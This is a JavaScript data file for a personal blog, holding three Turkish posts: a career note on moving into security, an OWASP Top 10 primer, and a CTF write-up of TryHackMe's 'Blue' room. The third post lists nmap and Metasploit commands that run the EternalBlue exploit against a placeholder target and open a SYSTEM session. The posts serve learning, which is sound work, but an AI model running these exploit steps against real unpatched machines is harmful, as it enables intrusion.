// src/data/posts.js
// TÜM YAZILARIN 'fullContent' ALANLARI DOLDURULDU

export default [
  {
    id: 1,
    slug: 'webden-siber-guvenlige',
    title: 'Web Geliştirmeden Siber Güvenliğe Geçiş',
    description: 'Neden web geliştirme kariyerimden siber güvenlik alanına yöneliyorum? Öğrenme sürecim ve hedeflerim üzerine notlar.',
    category: 'Kariyer',
    date: '4 Kasım 2025',
    fullContent: `
      <p class="text-lg text-slate-300 leading-relaxed mb-4">
        Bir bilgisayar mühendisi olarak, kod yazmak ve çalışan sistemler inşa etmek her zaman tutkum oldu. Vue.js ve Tailwind CSS gibi modern araçlarla arayüzler geliştirmek, somut ürünler ortaya koymak harika bir duygu. Ancak, inşa ettiğiniz bir yapının aynı zamanda 'güvenli' olmasını sağlamak, bu işin tamamen farklı ve daha derin bir katmanı.
      </p>
      
      <h2 class="text-2xl font-bold text-white mt-6 mb-3">Neden Siber Güvenlik?</h2>
      <p class="text-lg text-slate-300 leading-relaxed mb-4">
        Yazdığım her kod satırında, "Burası nasıl kötüye kullanılabilir?" diye düşünmeye başladığımı fark ettim. Bir 'feature' (özellik) geliştirmek kadar, o özelliğin 'bug' (hata) veya 'exploit' (zafiyet) haline gelmemesini sağlamak da ilgimi çekiyordu. Siber güvenlik, bir geliştiricinin savunma sanatıdır; bir "builder" (inşa edici) olmaktan "defender" (koruyucu) olmaya geçiştir.
      </p>
      
      <h2 class="text-2xl font-bold text-white mt-6 mb-3">Geliştirici Becerileri Nasıl Aktarılır?</h2>
      <p class="text-lg text-slate-300 leading-relaxed mb-4">
        Aslında, web geliştirme bilgisi siber güvenlik için mükemmel bir temeldir. Zafiyetleri bulmak için önce sistemin nasıl çalıştığını bilmek gerekir:
      </p>
      <ul class="list-disc list-outside pl-5 space-y-2 text-lg text-slate-300">
        <li><strong>Kod Okuma:</strong> Bir geliştirici olarak zaten sürekli kod okuyoruz. Bu, 'white-box' (beyaz kutu) testlerinde zafiyetleri bulmak için kritik bir beceridir.</li>
        <li><strong>API Bilgisi:</strong> REST veya GraphQL API'lerinin nasıl çalıştığını bilmek, API güvenliğini (örn: Kırık Erişim Kontrolü) test etmek için zorunludur.</li>
        <li><strong>Problem Çözme:</strong> Her iki alan da temelde karmaşık problemleri metodik olarak çözmeye dayanır.</li>
      </ul>

      <p class="text-lg text-slate-300 leading-relaxed mt-4">
        Bu blog, benim bu geçiş sürecimdeki notlarımı, öğrendiğim yeni araçları ve çözdüğüm CTF'leri belgeleyeceğim yer olacak.
      </p>
    `
  },
  {
    id: 2,
    slug: 'owasp-top-10',
    title: 'OWASP Top 10 Nedir? (Geliştirici Gözüyle)',
    description: 'Güvenli kod yazmanın temeli olan OWASP Top 10 zafiyetlerini bir yazılımcı bakış açısıyla inceliyorum. İlk 3 zafiyet...',
    category: 'Güvenlik',
    date: '1 Kasım 2025',
    fullContent: `
      <p class="text-lg text-slate-300 leading-relaxed mb-4">
        OWASP (Open Web Application Security Project), web uygulamalarının güvenliğini artırmayı amaçlayan, kar amacı gütmeyen bir kuruluştur. OWASP Top 10, bu kuruluşun belirlediği en kritik 10 web uygulaması güvenlik açığının bir listesidir. Bir geliştirici olarak bu listeyi bilmek, yazdığımız kodun kalitesini ve güvenliğini doğrudan etkiler.
      </p>
      
      <h2 class="text-2xl font-bold text-white mt-6 mb-3">A01: Kırık Erişim Kontrolü (Broken Access Control)</h2>
      <p class="text-lg text-slate-300 leading-relaxed mb-4">
        Bu zafiyet, kullanıcıların yetkileri dışındaki verilere veya işlevlere erişebilmesi durumunda ortaya çıkar. Örneğin, bir kullanıcının URL'yi değiştirerek (örn: <code>/user/12</code> yerine <code>/user/13</code> yazarak) başka bir kullanıcının bilgilerini görebilmesi. Geliştiricilerin, her istekte kullanıcının 'yetkisini' (authorization) sunucu tarafında kontrol etmesi gerekir.
      </p>
      
      <h2 class="text-2xl font-bold text-white mt-6 mb-3">A02: Kriptografik Hatalar (Cryptographic Failures)</h2>
      <p class="text-lg text-slate-300 leading-relaxed mb-4">
        Parolalar, kredi kartı bilgileri gibi hassas verilerin düz metin (plain text) olarak saklanması veya zayıf, güncelliğini yitirmiş şifreleme algoritmalarıyla korunmasıdır. Veriler her zaman 'at rest' (veritabanında) ve 'in transit' (ağ üzerinde) şifrelenmelidir.
      </p>
      
      <pre class="bg-slate-800 p-4 rounded-lg overflow-x-auto text-sm text-green-300 my-4">
<code>// KÖTÜ ÖRNEK (Zayıf ve eski hashleme)
const hashedPassword = md5(user.password);

// İYİ ÖRNEK (Güçlü, tuzlanmış (salted) hashleme)
const salt = bcrypt.genSaltSync(10);
const hashedPassword = bcrypt.hashSync(user.password, salt);</code></pre>

      <h2 class="text-2xl font-bold text-white mt-6 mb-3">A03: Enjeksiyon (Injection)</h2>
      <p class="text-lg text-slate-300 leading-relaxed mb-4">
        Enjeksiyon zafiyetleri, güvenilmeyen kullanıcı girdisinin (örn: bir arama formu) doğrudan bir komutun veya sorgunun parçası olarak yorumlanmasıyla oluşur. En bilineni SQL Enjeksiyonu'dur.
      </p>
    `
  },
  {
    id: 3,
    slug: 'ctf-blue-odasi',
    title: 'İlk CTF Deneyimim: TryHackMe "Blue" Odası',
    description: 'Bir "Capture The Flag" yarışmasında Windows zafiyetlerini (EternalBlue) kullanarak nasıl yetki yükselttiğimin adım adım çözümü.',
    category: 'CTF Çözümü',
    date: '28 Ekim 2025',
    fullContent: `
      <p class="text-lg text-slate-300 leading-relaxed mb-4">
        TryHackMe platformundaki "Blue" odası, siber güvenliğe yeni başlayanlar için en ünlü odalardan biridir. Bu oda, 2017'de WannaCry fidye yazılımının kullandığı <strong>MS17-010 (EternalBlue)</strong> zafiyetini temel alır. Bu benim ilk CTF (Capture The Flag) deneyimimdi ve işte adım adım çözüm (write-up).
      </p>

      <h2 class="text-2xl font-bold text-white mt-6 mb-3">Adım 1: Keşif (Reconnaissance)</h2>
      <p class="text-lg text-slate-300 leading-relaxed mb-4">
        Her şey hedef sistemi taramakla başlar. <code>nmap</code> kullanarak makinedeki açık portları ve servisleri taradım.
      </p>
      <pre class="bg-slate-800 p-4 rounded-lg overflow-x-auto text-sm text-green-300 my-4">
<code>$ nmap -sV [HEDEF_IP_ADRESİ]

PORT     STATE SERVICE      VERSION
...
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 (Samba)
...</code></pre>
      <p class="text-lg text-slate-300 leading-relaxed mb-4">
        Açık olan 445 portu (SMB servisi), MS17-010 zafiyeti için klasik bir hedeftir.
      </p>

      <h2 class="text-2xl font-bold text-white mt-6 mb-3">Adım 2: Zafiyeti Sömürme (Exploitation)</h2>
      <p class="text-lg text-slate-300 leading-relaxed mb-4">
        Bu zafiyeti sömürmek için <code>Metasploit</code> aracını kullandım. Metasploit'i açıp (<code>msfconsole</code>) ilgili exploiti aradım:
      </p>
      <pre class="bg-slate-800 p-4 rounded-lg overflow-x-auto text-sm text-green-300 my-4">
<code>msf6 > search ms17-010

...
0  exploit/windows/smb/ms17_010_eternalblue  ...
...

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS [HEDEF_IP_ADRESİ]
msf6 exploit(windows/smb/ms17_010_eternalblue) > run</code></pre>

      <h2 class="text-2xl font-bold text-white mt-6 mb-3">Adım 3: Yetki Yükseltme ve Bayraklar (Flags)</h2>
      <p class="text-lg text-slate-300 leading-relaxed mb-4">
        Exploit başarıyla çalıştığında, hedef sistemde <code>NT AUTHORITY\SYSTEM</code> (en yüksek yetki) haklarına sahip bir 'meterpreter' oturumu açıldı. Buradan sonra sistemdeki 'user.txt' ve 'root.txt' bayraklarını bulmak çok kolaydı.
      </p>
      <p class="text-lg text-slate-300 leading-relaxed mt-4">
        Bu CTF, bana eski ama yamalanmamış sistemlerin ne kadar büyük bir risk oluşturduğunu net bir şekilde gösterdi.
      </p>
    `
  }
];